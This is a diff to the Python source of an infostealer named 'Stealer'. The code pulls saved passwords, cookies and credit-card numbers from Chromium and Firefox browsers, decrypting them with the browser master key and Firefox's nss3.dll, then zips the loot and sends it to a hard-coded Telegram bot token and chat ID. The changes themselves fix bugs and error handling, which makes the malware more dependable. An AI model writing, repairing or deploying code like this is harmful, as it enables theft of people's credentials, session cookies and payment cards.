@@ -15,7 +15,7 @@ import requests
 from zipfile import ZipFile
 class Stealer():
 	def __init__(self):
-		#try:
+		try:
 			self.token = "5226296304:AAFALU7Us4WnjEx4RbJsV1U3ZyhGiKYxKFo"
 			self.chat_id = "5176730926"
 			self.result = {}
@@ -27,8 +27,8 @@ class Stealer():
 			self.Save(self.result)
 			self.SendMessage("%F0%9F%93%8C Sending File...")
 			self.Zip_Folder()
-		#except:
-		#	self.SendMessage(" Stealer Error : \n  Message : " + traceback.format_exc())
+		except:
+			self.SendMessage(" Stealer Error : \n  Message : " + traceback.format_exc())
 	def Zip_Folder(self):
 		dirname = os.environ['TEMP'] + "\\" + os.environ['USERNAME'] + "\\"
 		output = os.environ['TEMP'] + "\\" + os.environ['USERNAME'] + '.zip'
@@ -53,15 +53,15 @@ class Stealer():
 				file = open(filename,"w")
 				for item in result[browser]["Passwords"]:
 					try:
-						url = item['URL'].decode()
+						url = item['URL']
 					except:
 						url = ""
 					try:
-						username = item['Username'].decode()
+						username = item['Username']
 					except:
 						username = ""
 					try:
-						password = item['Password'].decode()
+						password = item['Password']
 					except:
 						password = ""
 					file.write("URL : " + url + "\n")
@@ -70,8 +70,6 @@ class Stealer():
 			if "Cookies" in result[browser].keys():
 				filename = outdir + "Cookies.txt"
 				file = open(filename,"w")
-				print(result[browser]["Cookies"])
-				print(type(result[browser]["Cookies"]))
 				file.write(json.dumps(result[browser]["Cookies"]))
 				file.close()
 			if "Credit Cards" in result[browser].keys():
@@ -79,19 +77,19 @@ class Stealer():
 				file = open(filename,"w")
 				for item in result[browser]["Credit Cards"]:
 					try:
-						number = item['Number'].decode()
+						number = item['Number']
 					except:
 						number = ""
 					try:
-						year = item['Year'].decode()
+						year = item['Year']
 					except:
 						year = ""
 					try:
-						month = item['Month'].decode()
+						month = item['Month']
 					except:
 						month = ""
 					try:
-						name = item['Name'].decode()
+						name = item['Name']
 					except:
 						name = ""
 					file.write("Name : " + name + "\n")
@@ -259,8 +257,8 @@ class Chromium():
 						for r in cursor.fetchall():
 							data = {}
 							data['Number'] = self.decrypt_password(r[0], master_key)
-							data['Year'] = r[1]
-							data['Month'] = r[2]
+							data['Year'] = str(r[1])
+							data['Month'] = str(r[2])
 							data['Name'] = r[3]
 							result.append(data)
 					except Exception as e:
@@ -348,31 +346,32 @@ class Firefox():
 	def Passwords(self):
 		try:
 			firefox_path = r"C:\Program Files\Mozilla Firefox"
-			self.nss3 = CDLLEx(os.path.join(firefox_path, 'nss3.dll'), 0x00000008)
-			self.nss3.PK11SDR_Decrypt.restype = ctypes.c_int
-			self.nss3.PK11SDR_Decrypt.argtypes = (ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p)
-			for browser in self.browsers.keys():
-				dirname = os.environ['USERPROFILE'] + os.sep + self.browsers[browser]
-				profiles = self.Enumerate_Profiles(dirname)
-				result = []
-				for p in profiles:
-					encprof = p.encode("utf8")
-					init = self.nss3.NSS_Init(b"sql:" + encprof)
-					file = open(p + r"\logins.json","r")
-					read = file.read()
-					file.close()
-					data = json.loads(read)
+			if os.path.exists(firefox_path):
+				self.nss3 = CDLLEx(os.path.join(firefox_path, 'nss3.dll'), 0x00000008)
+				self.nss3.PK11SDR_Decrypt.restype = ctypes.c_int
+				self.nss3.PK11SDR_Decrypt.argtypes = (ctypes.POINTER(SECItem), ctypes.POINTER(SECItem), ctypes.c_void_p)
+				for browser in self.browsers.keys():
+					dirname = os.environ['USERPROFILE'] + os.sep + self.browsers[browser]
+					profiles = self.Enumerate_Profiles(dirname)
 					result = []
-					for i in data['logins']:
-						data = {}
-						data['URL'] = i['hostname'].decode()
-						data['Username'] = self.Decrypt(i['encryptedUsername'])
-						data['Password'] = self.Decrypt(i['encryptedPassword'])
-						result.append(data)
-					if result:
-						if browser not in self.json.keys():
-							self.json[browser] = {}
-						self.json[browser].update({'Passwords' : result})
+					for p in profiles:
+						encprof = p.encode("utf8")
+						init = self.nss3.NSS_Init(b"sql:" + encprof)
+						file = open(p + r"\logins.json","r")
+						read = file.read()
+						file.close()
+						data = json.loads(read)
+						result = []
+						for i in data['logins']:
+							data = {}
+							data['URL'] = i['hostname'].decode()
+							data['Username'] = self.Decrypt(i['encryptedUsername'])
+							data['Password'] = self.Decrypt(i['encryptedPassword'])
+							result.append(data)
+						if result:
+							if browser not in self.json.keys():
+								self.json[browser] = {}
+							self.json[browser].update({'Passwords' : result})
 		except Exception as ex:
 			self.main_self.SendMessage(" Stealer Error : \n  " + str(ex))
 	def Enumerate_Profiles(self, folder):
@@ -395,13 +394,13 @@ class Firefox():
 		result = ctypes.string_at(out.data, out.len).decode("utf8")
 		return result
 class SECItem(ctypes.Structure):
-    _fields_ = [
-        ('type', ctypes.c_uint),
-        ('data', ctypes.c_char_p),
-        ('len', ctypes.c_uint),
-    ]
+	_fields_ = [
+		('type', ctypes.c_uint),
+		('data', ctypes.c_char_p),
+		('len', ctypes.c_uint),
+	]
 class PK11SlotInfo(ctypes.Structure):
-    pass
+	pass
 from ctypes import wintypes
 kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
 kernel32.LoadLibraryExW.restype = wintypes.HMODULE
